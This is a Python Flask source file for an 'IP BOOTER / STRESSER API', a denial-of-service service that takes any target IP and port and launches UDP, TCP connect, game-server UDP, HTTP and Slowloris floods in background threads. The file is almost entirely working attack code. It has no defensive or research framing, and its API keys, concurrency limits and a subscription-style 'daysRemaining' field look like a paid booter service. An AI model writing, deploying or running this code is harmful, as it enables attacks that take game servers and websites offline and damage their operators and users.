from flask import Flask, request, jsonify
import time
import uuid
import threading
import socket
import random
import os
import requests
from datetime import datetime

app = Flask(__name__)

# ============================================
# CONFIGURATION
# ============================================
API_KEY = "booter_super_secret_key_2025"
ADMIN_KEY = "prime_papa_ji"
PORT = 10000

# Attack limits
MAX_DURATION = 300  # 5 minutes
MIN_DURATION = 10
MAX_CONCURRENT = 10

# Blocked ports (security)
BLOCKED_PORTS = {443, 8700, 17500, 20000, 20001, 20002, 9031, 22, 3389, 3306, 5432}

# Store active attacks
active_attacks = {}

# User agents for HTTP flood
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
]

# ============================================
# AUTHENTICATION
# ============================================
def verify_api_key():
    key = request.headers.get('x-api-key') or request.args.get('key')
    return key == API_KEY

def verify_admin():
    key = request.headers.get('X-Admin-Key')
    return key == ADMIN_KEY

# ============================================
# LAYER 4 - UDP FLOOD
# ============================================
def udp_flood(target_ip, target_port, duration, attack_id):
    """UDP Flood - Layer 4"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Random payload sizes
        payloads = [random._urandom(x) for x in [512, 1024, 2048, 4096, 8192]]
        
        end_time = time.time() + duration
        
        packet_count = 0
        while time.time() < end_time:
            try:
                payload = random.choice(payloads)
                sock.sendto(payload, (target_ip, target_port))
                packet_count += 1
            except:
                pass
        
        sock.close()
        print(f"[✓] UDP Flood completed: {packet_count} packets sent")
        return packet_count
    except Exception as e:
        print(f"[!] UDP Flood error: {e}")
        return 0

# ============================================
# LAYER 4 - TCP SYN FLOOD
# ============================================
def tcp_syn_flood(target_ip, target_port, duration, attack_id):
    """TCP SYN Flood - Layer 4"""
    try:
        end_time = time.time() + duration
        packet_count = 0
        
        def syn_flood():
            nonlocal packet_count
            while time.time() < end_time and attack_id in active_attacks:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    sock.close()
                    packet_count += 1
                except:
                    pass
        
        # 100 threads for SYN flood
        threads = []
        for _ in range(100):
            t = threading.Thread(target=syn_flood)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=duration + 5)
        
        print(f"[✓] TCP SYN Flood completed: {packet_count} connections")
        return packet_count
    except Exception as e:
        print(f"[!] TCP SYN error: {e}")
        return 0

# ============================================
# LAYER 4 - UDP GAME FLOOD (BGMI/Minecraft/CS:GO)
# ============================================
def udp_game_flood(target_ip, target_port, duration, attack_id):
    """UDP Game Flood - Layer 4 (Game specific)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Game-specific payloads
        game_payloads = [
            b'\xFE\xFD\x09\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d',  # Minecraft query
            b'\xFF\xFF\xFF\xFF\x73\x65\x72\x76\x65\x72\x20\x71\x75\x65\x72\x79',  # Source query
            b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Generic game
            random._urandom(512),  # Random game data
            random._urandom(1024),
            random._urandom(2048),
        ]
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time:
            try:
                payload = random.choice(game_payloads)
                sock.sendto(payload, (target_ip, target_port))
                packet_count += 1
            except:
                pass
        
        sock.close()
        print(f"[✓] UDP Game Flood completed: {packet_count} packets")
        return packet_count
    except Exception as e:
        print(f"[!] UDP Game error: {e}")
        return 0

# ============================================
# LAYER 7 - HTTP FLOOD
# ============================================
def http_flood(target_ip, target_port, duration, attack_id):
    """HTTP Flood - Layer 7"""
    try:
        session = requests.Session()
        end_time = time.time() + duration
        
        # Paths to target
        paths = ['/', '/index.html', '/api', '/login', '/admin', '/home', '/about', '/contact']
        
        request_count = 0
        
        while time.time() < end_time and attack_id in active_attacks:
            try:
                path = random.choice(paths)
                url = f"http://{target_ip}:{target_port}{path}"
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                # Random GET or POST
                if random.choice([True, False]):
                    session.get(url, headers=headers, timeout=1)
                else:
                    session.post(url, headers=headers, data={'fake': 'data'}, timeout=1)
                
                request_count += 1
            except:
                pass
        
        print(f"[✓] HTTP Flood completed: {request_count} requests")
        return request_count
    except Exception as e:
        print(f"[!] HTTP Flood error: {e}")
        return 0

# ============================================
# LAYER 7 - SLOWLORIS (Slow HTTP Attack)
# ============================================
def slowloris_attack(target_ip, target_port, duration, attack_id):
    """Slowloris - Layer 7 (Keep connections open)"""
    try:
        sockets = []
        end_time = time.time() + duration
        
        # Create initial connections
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sockets.append(sock)
            except:
                pass
        
        # Keep sending partial headers
        while time.time() < end_time and attack_id in active_attacks:
            for sock in sockets[:]:
                try:
                    sock.send(b"X-random-header: " + random._urandom(10) + b"\r\n")
                except:
                    sockets.remove(sock)
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(4)
                        new_sock.connect((target_ip, target_port))
                        new_sock.send(b"GET / HTTP/1.1\r\n")
                        new_sock.send(f"Host: {target_ip}\r\n".encode())
                        sockets.append(new_sock)
                    except:
                        pass
            time.sleep(10)
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print(f"[✓] Slowloris completed: {len(sockets)} concurrent connections")
        return len(sockets)
    except Exception as e:
        print(f"[!] Slowloris error: {e}")
        return 0

# ============================================
# MAIN ATTACK ENDPOINT
# ============================================
@app.route('/api/v1/attack', methods=['POST'])
def launch_attack():
    if not verify_api_key():
        return jsonify({"success": False, "error": "Invalid API key"}), 401
    
    data = request.json
    target_ip = data.get('ip')
    target_port = data.get('port')
    duration = data.get('duration')
    method = data.get('method', 'udp').lower()
    
    # Validation
    if not all([target_ip, target_port, duration]):
        return jsonify({"success": False, "error": "Missing parameters: ip, port, duration"}), 400
    
    try:
        target_port = int(target_port)
        duration = int(duration)
        
        if target_port in BLOCKED_PORTS:
            return jsonify({"success": False, "error": f"Port {target_port} is blocked"}), 403
        
        if target_port < 1 or target_port > 65535:
            return jsonify({"success": False, "error": "Invalid port range"}), 400
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            return jsonify({"success": False, "error": f"Duration must be {MIN_DURATION}-{MAX_DURATION} seconds"}), 400
    except:
        return jsonify({"success": False, "error": "Invalid parameters"}), 400
    
    # Check concurrent limit
    active_count = len(active_attacks)
    if active_count >= MAX_CONCURRENT:
        return jsonify({"success": False, "error": f"Max concurrent attacks ({MAX_CONCURRENT}) reached. Try again later."}), 429
    
    # Generate attack ID
    attack_id = str(uuid.uuid4())[:8]
    ends_at = time.time() + duration
    
    # Store attack
    active_attacks[attack_id] = {
        "ip": target_ip,
        "port": target_port,
        "duration": duration,
        "method": method,
        "expiresAt": ends_at,
        "startedAt": time.time()
    }
    
    print(f"\n{'='*50}")
    print(f"🔥 NEW ATTACK")
    print(f"   ID: {attack_id}")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Duration: {duration}s")
    print(f"   Method: {method.upper()}")
    print(f"{'='*50}")
    
    # Launch attack in background
    def run_attack():
        try:
            if method == 'udp':
                udp_flood(target_ip, target_port, duration, attack_id)
            elif method == 'tcp':
                tcp_syn_flood(target_ip, target_port, duration, attack_id)
            elif method == 'udp_game':
                udp_game_flood(target_ip, target_port, duration, attack_id)
            elif method == 'http':
                http_flood(target_ip, target_port, duration, attack_id)
            elif method == 'slowloris':
                slowloris_attack(target_ip, target_port, duration, attack_id)
            else:
                udp_flood(target_ip, target_port, duration, attack_id)
        except Exception as e:
            print(f"[!] Attack error: {e}")
        finally:
            active_attacks.pop(attack_id, None)
            print(f"[✓] Attack {attack_id} finished")
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "success": True,
        "message": f"{method.upper()} attack launched successfully",
        "attack": {
            "id": attack_id,
            "target": target_ip,
            "port": target_port,
            "duration": duration,
            "method": method,
            "endsAt": ends_at
        },
        "limits": {
            "currentActive": len(active_attacks),
            "maxConcurrent": MAX_CONCURRENT,
            "remainingSlots": MAX_CONCURRENT - len(active_attacks)
        }
    })

# ============================================
# OTHER ENDPOINTS
# ============================================
@app.route('/')
def home():
    return jsonify({
        "name": "IP BOOTER / STRESSER API",
        "version": "3.0",
        "status": "running",
        "methods": ["udp", "tcp", "udp_game", "http", "slowloris"],
        "max_duration": f"{MAX_DURATION} seconds",
        "max_concurrent": MAX_CONCURRENT,
        "endpoints": {
            "attack": "POST /api/v1/attack",
            "health": "GET /api/v1/health",
            "active": "GET /api/v1/active",
            "stats": "GET /api/v1/stats"
        }
    })

@app.route('/api/v1/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": time.time(),
        "active_attacks": len(active_attacks),
        "methods": ["udp", "tcp", "udp_game", "http", "slowloris"]
    })

@app.route('/api/v1/active', methods=['GET'])
def get_active():
    if not verify_api_key():
        return jsonify({"success": False, "error": "Invalid API key"}), 401
    
    current_time = time.time()
    active_list = []
    
    for aid, attack in list(active_attacks.items()):
        if attack['expiresAt'] > current_time:
            active_list.append({
                "target": f"{attack['ip']}:{attack['port']}",
                "method": attack['method'],
                "expiresIn": int(attack['expiresAt'] - current_time),
                "attackId": aid
            })
    
    return jsonify({
        "success": True,
        "activeAttacks": active_list,
        "count": len(active_list),
        "maxConcurrent": MAX_CONCURRENT
    })

@app.route('/api/v1/stats', methods=['GET'])
def get_stats():
    if not verify_api_key():
        return jsonify({"success": False, "error": "Invalid API key"}), 401
    
    return jsonify({
        "success": True,
        "status": "active",
        "daysRemaining": 365,
        "maxDuration": MAX_DURATION,
        "maxConcurrent": MAX_CONCURRENT,
        "methods": ["udp", "tcp", "udp_game", "http", "slowloris"]
    })

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔥 IP BOOTER / STRESSER API")
    print("="*60)
    print(f"📍 Port: {PORT}")
    print(f"🔑 API Key: {API_KEY}")
    print(f"⚡ Methods: UDP | TCP | UDP_GAME | HTTP | SLOWLORIS")
    print(f"⏱️ Max Duration: {MAX_DURATION}s")
    print(f"🎯 Max Concurrent: {MAX_CONCURRENT}")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)